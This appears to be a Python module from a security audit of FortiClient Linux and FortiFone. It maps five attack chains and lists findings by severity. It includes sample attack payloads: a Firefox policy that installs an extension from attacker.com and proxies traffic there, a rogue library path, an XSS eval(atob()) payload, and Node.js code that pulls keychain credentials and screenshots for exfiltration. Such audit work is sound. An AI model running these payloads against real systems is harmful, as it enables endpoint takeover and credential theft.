"""
FortiClient Linux -- Cross-finding EMS Compromise Attack Chain Analysis
Synthesizes: CONFIGHANDLER-F01, EPCTRL-F01/F02/F03, FCTDNS-F01, FIREWALL-F01, VPN-F01,
             IKED-F01, FCTSCHED-F01, FORTITRAY-F02/F03, UPDATE-F01/F02

This module documents the full coordinated attack chains enabled by a single
EMS (FortiClient Enterprise Management Server) compromise against all enrolled endpoints.
"""

# ---------------------------------------------------------
# EMS-CHAIN-A: EMS compromise -> fleet-wide root execution
# ---------------------------------------------------------
EMS_CHAIN_A_ROOT_EXEC = {
    "id":       "EMS-CHAIN-A",
    "title":    "EMS compromise -> fleet-wide root code execution (pkcs11_lib injection + auto_patch MITM)",
    "severity": "CRITICAL -- single EMS server compromise -> root execution on all enrolled FortiClient endpoints",
    "findings_involved": [
        "CONFIGHANDLER-F01: pkcs11_lib EMS policy field -> dlopen() of attacker .so in vpn daemon",
        "EPCTRL-F01: EMS pushes rogue CA cert -> system trust store",
        "EPCTRL-F03: rogue CA + auto_patch -> MITM patch channel -> malicious package as root",
        "UPDATE-F01: libcurl 8.7.1 CVE-2024-2379 on patch download channel",
        "FCTSCHED-F03: auto_patch executes downloaded packages without interactive confirmation",
    ],

    "chain": [
        "Step 1: Compromise EMS server.",
        "         Attack: CVE against EMS web UI, stolen admin credentials, rogue EMS via DNS spoofing,",
        "         or SSRF/RCE in FortiManager (which manages EMS). See FSOAR-CHAIN for FortiManager RCE paths.",

        "Step 2a [pkcs11_lib path]: Push policy with pkcs11_lib=/tmp/evil.so to all enrolled endpoints.",
        "         confighandler distributes the policy to the vpn daemon.",
        "         When any enrolled user initiates a VPN connection, the vpn daemon calls dlopen('/tmp/evil.so').",
        "         __attribute__((constructor)) in evil.so runs immediately with vpn daemon privileges (likely root).",
        "         Fleet impact: all enrolled endpoints that connect VPN.",

        "Step 2b [rogue CA path]: Push a rogue CA certificate to all enrolled endpoints via epctrl.",
        "         epctrl calls update-ca-certificates, installing the rogue CA in /etc/pki/ca-trust/source/anchors/.",
        "         ALL applications using the system trust store now accept the rogue CA.",

        "Step 3 [rogue CA path continued]: Set the auto_patch update server to an attacker URL.",
        "         fctsched triggers auto_patch -> update daemon fetches package over HTTPS.",
        "         MITM with rogue CA cert -> return malicious .deb/.rpm with root post-install script.",
        "         epctrl executes the malicious package with root privileges.",

        "Result: Root code execution on all enrolled FortiClient endpoints simultaneously.",
        "Dwell time: seconds after EMS policy push propagates.",
    ],

    "scale": (
        "If EMS manages N endpoints: N simultaneous root compromises from one EMS breach. "
        "FortiClient EMS is typically deployed to manage thousands of enterprise endpoints. "
        "A single EMS compromise = equivalent blast radius of a supply chain attack."
    ),
}


# ---------------------------------------------------------
# EMS-CHAIN-B: EMS compromise -> fleet-wide HTTPS MITM + browser compromise
# ---------------------------------------------------------
EMS_CHAIN_B_BROWSER_MITM = {
    "id":       "EMS-CHAIN-B",
    "title":    "EMS compromise -> rogue CA + Firefox policy injection -> endpoint-wide HTTPS MITM",
    "severity": "CRITICAL -- compromised EMS installs rogue CA and injects Firefox enterprise policy on all endpoints",
    "findings_involved": [
        "EPCTRL-F01: EMS pushes rogue CA cert -> system trust store -> all HTTPS MITM",
        "EPCTRL-F02: EMS pushes Firefox policies.json -> malicious extension + proxy + TLS error disable",
        "FCTDNS-F01: ZTNA DNS fake certificate generation -> targeted domain TLS interception",
    ],

    "chain": [
        "Step 1: EMS compromise (same as CHAIN-A Step 1).",

        "Step 2: Push rogue CA to all endpoints (EPCTRL-F01).",
        "         Rogue CA now trusted by: curl, wget, apt, pip, npm, Python requests, Go http.Client,",
        "         Node.js https module, OpenSSL-linked applications -- everything using system trust store.",

        "Step 3: Push Firefox enterprise policy (EPCTRL-F02).",
        "         /etc/firefox/policies/policies.json content:",
        '         {"policies":{"Certificates":{"ImportEnterpriseRoots":true},',
        '           "Extensions":{"Install":["https://attacker.com/monitor.xpi"]},',
        '           "Proxy":{"Mode":"manual","HTTPProxy":"attacker.com:8080"},',
        '           "DisableTelemetry":true}}',
        "         Firefox now: (a) trusts rogue CA, (b) installs attacker extension,",
        "         (c) routes all traffic through attacker proxy, (d) doesn't report to Mozilla.",

        "Step 4: ZTNA DNS interception (FCTDNS-F01).",
        "         fctdns generates fake TLS certificates for intercepted domains using the rogue CA.",
        "         Endpoint traffic to corporate SaaS apps is transparently intercepted.",

        "Result: Complete HTTPS MITM on all endpoint traffic.",
        "        Credentials entered in any website captured by attacker proxy.",
        "        All browser sessions monitored by attacker extension.",
    ],
}


# ---------------------------------------------------------
# EMS-CHAIN-C: Rogue FortiGate -> pre-auth IKEv2 -> RCE + credential harvest
# ---------------------------------------------------------
EMS_CHAIN_C_ROGUE_FORTIGATE = {
    "id":       "EMS-CHAIN-C",
    "title":    "Rogue FortiGate -> IKED-F01 pre-auth IKEv2 frag overflow + IKED-F05 EAP-TTLS credential harvest",
    "severity": "CRITICAL (pre-auth network-reachable) -- rogue FortiGate triggers pre-auth memory corruption in iked",
    "findings_involved": [
        "VPN-F01: autoconnect on evil twin network -> rogue FortiGate auto-accepted",
        "IKED-F01: ikev2_frags_reassemble pre-auth memory corruption via crafted fragments",
        "IKED-F02: Fortinet proprietary IKEv2 payloads parsed without RFC validation",
        "IKED-F04: SAML assertion via fct/saml.cpp -> XXE + signature wrapping",
        "IKED-F05: EAP-TTLS inner credentials captured by rogue FortiGate MITM",
    ],

    "chain": [
        "Step 1 [network position]: Set up an evil twin wireless AP matching the corporate SSID.",
        "         The FortiClient autoconnect feature (VPN-F01) triggers a VPN connection",
        "         to the rogue network's VPN endpoint (masquerading as the corporate FortiGate).",
        "         The endpoint automatically accepts the connection because autoconnect only checks",
        "         for 'off-net' state, not VPN server certificate validity in all configurations.",

        "Step 2a [IKED-F01 pre-auth overflow]: Send crafted IKEv2 fragmented packets to UDP 500.",
        "         Before authentication (IKE_SA_INIT exchange), attacker sends fragmented IKEv2 packets.",
        "         ikev2_frags_reassemble at VA 0x5f1000 processes attacker-controlled fragment data.",
        "         PLAUSIBLE: indirect dispatch to frags_reassemble bypasses ikev2_check_frag_oversize",
        "         (3 call sites confirmed, but frags_reassemble invoked via function pointer).",
        "         If exploitable: heap overflow in iked -> remote code execution pre-authentication.",

        "Step 2b [IKED-F05 credential harvest]: Rogue FortiGate initiates EAP-TTLS authentication.",
        "         iked's EAP-TTLS peer (eap/eap_peer/eap_ttls.c) accepts the rogue server's certificate.",
        "         Inner EAP-TTLS credentials (username/password) transmitted inside the TLS tunnel",
        "         are readable by the rogue FortiGate -- no certificate pinning on the inner tunnel.",
        "         Credentials stored in plaintext in the iked heap during authentication.",

        "Step 2c [IKED-F04 SAML]: Rogue FortiGate sends crafted SAML assertion via IKEv2.",
        "         fct/saml.cpp parses SAML XML without XXE protection.",
        "         External entity expansion (XXE) reads local files (/etc/passwd, ssh keys).",
        "         XML signature wrapping bypasses assertion validation.",

        "Result: Pre-auth network-reachable RCE OR credential capture, depending on exploitation path.",
    ],
}


# ---------------------------------------------------------
# EMS-CHAIN-D: Local privilege escalation chain via shared IPC + pkexec
# ---------------------------------------------------------
EMS_CHAIN_D_LOCAL_PRIVESC = {
    "id":       "EMS-CHAIN-D",
    "title":    "Local unprivileged user -> shared NNG IPC injection -> confighandler policy overwrite -> pkexec root",
    "severity": "HIGH -- any local user on an endpoint can escalate to root via FortiClient attack surface",
    "findings_involved": [
        "FCTSCHED-F01: shared NNG IPC socket world-accessible; any local process injects messages",
        "CONFIGHANDLER-F03: policy hub compromise cascades to all daemons",
        "CONFIGHANDLER-F01: pkcs11_lib injection via policy",
        "FORTITRAY-F03: pkexec /bin/bash invocation -> CVE-2021-4034 surface",
        "FORTITRAY-F04: three NNG IPC sockets in fortitray; fortitray-specific sockets world-accessible",
    ],

    "chain": [
        "Step 1: Local user (low-privilege shell, e.g., via CLI-F01 credential leak or network access).",

        "Step 2: Inject a malicious policy update into the confighandler IPC socket (FCTSCHED-F01).",
        "         Socket: /var/run/forticlient/8f6ddf1358bd9d067261f529f69fda59.ipc",
        "         If world-writable: craft an NNG IPC message setting pkcs11_lib=/tmp/evil.so.",
        "         confighandler distributes this to the vpn daemon.",

        "Step 3a [pkcs11_lib path]: When the VPN daemon loads the PKCS#11 library (any VPN connect),",
        "         dlopen('/tmp/evil.so') executes __attribute__((constructor)) as the vpn daemon UID.",
        "         If vpn daemon is root: immediate local privilege escalation.",

        "Step 3b [pkexec path]: Trigger fortitray's stop-forticlient flow.",
        "         fortitray executes: pkexec /bin/bash /opt/forticlient/stop-forticlient.sh",
        "         If polkit < 0.120 (CVE-2021-4034 unpatched): pkexec environment variable "
        "         manipulation -> root execution.",

        "Step 3c [fortitray IPC path]: Inject message into fortitray's specific IPC sockets",
        "         (8668fd42ebc016367da6f8d16e455684.ipc or 8e145d51ebfccd7ee77b3eed706792fe.ipc).",
        "         Trigger a fabricagent:// URL handler with shell metacharacters in the URL parameter",
        "         (FORTITRAY-F02): /bin/bash -c 'xdg-open fabricagent://ems/msg?id=' + PAYLOAD.",
        "         If URL parameter reaches shell expansion unsanitized: command injection as fortitray.",

        "Result: Local privilege escalation to root or daemon-level privileges from any local user account.",
    ],
}


# ---------------------------------------------------------
# EMS-CHAIN-E: FortiClient Linux + FortiFone Windows combined attack
# ---------------------------------------------------------
EMS_CHAIN_E_FORTIFONE_RCE = {
    "id":       "EMS-CHAIN-E",
    "title":    "Rogue FortiVoice PBX -> SIP.js 0.11.6 HTML body injection -> nodeIntegration RCE on Windows FortiFone",
    "severity": "CRITICAL -- rogue PBX -> FortiFone XSS -> OS command execution + keychain credential extraction",
    "findings_involved": [
        "FPHONE-F03: nodeIntegration: true on all FortiFone renderer windows",
        "FPHONE-F04: SIP.js 0.11.6 (2018) parses rogue PBX SIP messages in renderer",
        "FPHONE-F05: strophe.js 1.6.0 XMPP chat injection from rogue server",
        "FPHONE-F09: keytar credential store accessible from nodeIntegration renderer",
        "FPHONE-F10: robotjs desktop automation from renderer",
    ],

    "chain": [
        "Step 1: Configure rogue FortiVoice PBX on attacker infrastructure.",
        "         Target's FortiFone is misconfigured to use attacker PBX (DNS spoofing or social engineering).",
        "         Alternatively: MITM on the WebSocket/SIP channel between target and legitimate PBX.",

        "Step 2: Send SIP MESSAGE or XMPP message with crafted HTML/JavaScript body.",
        "         SIP MESSAGE payload:",
        "         Content-Type: text/html",
        "         Body: <img src=x onerror=\"eval(atob('BASE64_ENCODED_PAYLOAD'))\">",
        "         Where BASE64_ENCODED_PAYLOAD decodes to Node.js RCE + credential extraction code.",

        "Step 3: fvoiceSipAgent2.js or fvoiceChat.js receives the message.",
        "         The React UI renders the body content in the CALL or CHAT_AGENT renderer.",
        "         nodeIntegration: true + contextIsolation: false -> payload executes with Node.js access.",

        "Step 4: Payload extracts credentials from keytar:",
        "         const keytar = require('keytar');",
        "         keytar.findCredentials('fortifone').then(creds => { /* exfiltrate */ });",

        "Step 5: Payload captures desktop screenshot via robotjs:",
        "         const robot = require('robotjs');",
        "         const screen = robot.screen.capture();",
        "         /* exfiltrate screenshot to attacker C2 */",

        "Step 6 (optional): Payload establishes persistent backdoor:",
        "         const {exec} = require('child_process');",
        "         exec('powershell -w hidden -c \"...\"');",

        "Result: Zero-click (call delivery) credential extraction, desktop surveillance, and persistent backdoor.",
        "No user interaction required beyond receiving the SIP call or XMPP message.",
    ],
}


# ---------------------------------------------------------
# Summary: all findings by severity
# ---------------------------------------------------------
ALL_FINDINGS_SUMMARY = {
    "CRITICAL": [
        "CONFIGHANDLER-F01: pkcs11_lib -> dlopen() fleet-wide code execution via EMS",
        "CONFIGHANDLER-F03: confighandler compromise cascades to all daemons",
        "EPCTRL-F01: EMS rogue CA -> system trust store -> fleet HTTPS MITM",
        "EPCTRL-F03: rogue CA + auto_patch + CVE-2024-2379 -> fleet root execution",
        "IKED-F01 (PLAUSIBLE): pre-auth IKEv2 fragment reassembly memory corruption",
        "FPHONE-F03: nodeIntegration: true all FortiFone renderers -> XSS = OS exec",
        "FPHONE-F04: SIP.js 0.11.6 rogue PBX SIP body -> XSS -> Node.js exec",
        "FPHONE-F05: strophe.js XMPP chat injection -> XSS -> Node.js exec",
    ],

    "HIGH": [
        "VPN-F01: on_connect script injection in VPN profiles -> daemon-level RCE",
        "VPN-F05: GNOME keyring credential extraction from vpn daemon heap",
        "EPCTRL-F02: Firefox policy injection -> malicious extension + proxy on all endpoints",
        "CERTD-F01: certd software TPM fallback -> CA private key exposure on shared storage",
        "TLAUNCH-F01: CivetWeb SSI #exec -> code execution via localhost HTTP",
        "TLAUNCH-F02: CivetWeb CGI -> code execution via localhost HTTP",
        "FORTITRAY-F01: FortiDeceptor binary unpack-and-exec; writable path = binary replacement",
        "FORTITRAY-F02: fabricagent:// URL shell injection via /bin/bash -c xdg-open",
        "FORTITRAY-F03: pkexec invocation + unpatched polkit (CVE-2021-4034) = local root",
        "FORTITRAY-F05: second CivetWeb in fortitray (same SSI/CGI as TLAUNCH-F01)",
        "FCTDNS-F01: CA key exposure -> full HTTPS session decryption in ZTNA",
        "FCTDNS-F02: arbitrary domain DNS interception via rogue FortiGate",
        "FIREWALL-F01: TPROXY pre-auth packet interception from rogue ZTNA rules",
        "IKED-F02: proprietary IKEv2 payloads without RFC validation",
        "IKED-F04: SAML XXE + signature wrapping via rogue FortiGate",
        "IKED-F05: EAP-TTLS inner credentials readable by rogue FortiGate MITM",
        "UPDATE-F01: libcurl 8.7.1 CVE-2024-2379 QUIC cert bypass on update channel",
        "CONFIGHANDLER-F02: OAuth authorization_code in plaintext SQLite database",
        "FPAM-F01: FortiPAM keylogger capability",
        "FPAM-F02: postMessage wildcard -> credential exfiltration from PAM UI",
        "FPAM-F03: Chrome extension externally_connectable -> PAM session access",
        "FPHONE-F06: shell.openExternal unvalidated URL -> arbitrary protocol handler",
        "FPHONE-F07: jQuery 1.12.2 CVE-2019-11358 + CVE-2020-7656 in nodeIntegration renderer",
        "FPHONE-F08: @electron/remote globally enabled -> main process API from renderer XSS",
        "FPHONE-F09: keytar OS keychain accessible from nodeIntegration renderer XSS",
        "FPHONE-F10: robotjs desktop automation accessible from nodeIntegration renderer XSS",
    ],

    "MEDIUM": [
        "FIREWALL-F02: gRPC socket auth posture unconfirmed",
        "FIREWALL-F03: nftables flowtable offload bypasses per-packet inspection",
        "FCTSCHED-F01: hardcoded NNG IPC socket world-accessible",
        "FCTSCHED-F02: automatic_virus_submission silently uploads files to Fortinet cloud",
        "FORTIVPN-F01: autoconnect on evil twin -> rogue FortiGate chain entry point",
        "FCTDNS-F03: hardcoded Cloudflare DoH bypasses corporate DNS policy",
        "FORTITRAY-F04: three NNG IPC sockets expand tray message injection surface",
        "CLI-F01: --save-password credential persistence via shell history + IPC",
        "CLI-F02: VPN name injection potential via SQLite or shell metacharacters",
        "UPDATE-F02: EMS_FINGERPRINT pinning scoped; CDN downloads may be unpinned",
        "CONFIGHANDLER-F04: warp/hyper HTTP/2 CONTINUATION flood DoS",
        "NNG-ARCH: all daemons share world-accessible IPC socket",
        "CERTD-F02: no PCR binding on TPM keys -> PCRS bypass via alternate boot",
        "EPCTRL-F04: host check hash algorithm unknown; MD5/SHA1 = compliance bypass",
        "IKED-F03: ikev2_getimsgdata length check failure messages",
        "FPHONE-F01 (NSIS stub): lstrcpyA in NSIS loader (pre-app; not in actual SIP stack)",
        "FPHONE-F02 (NSIS stub): DLL hijacking surface in installer binaries",
    ],
}
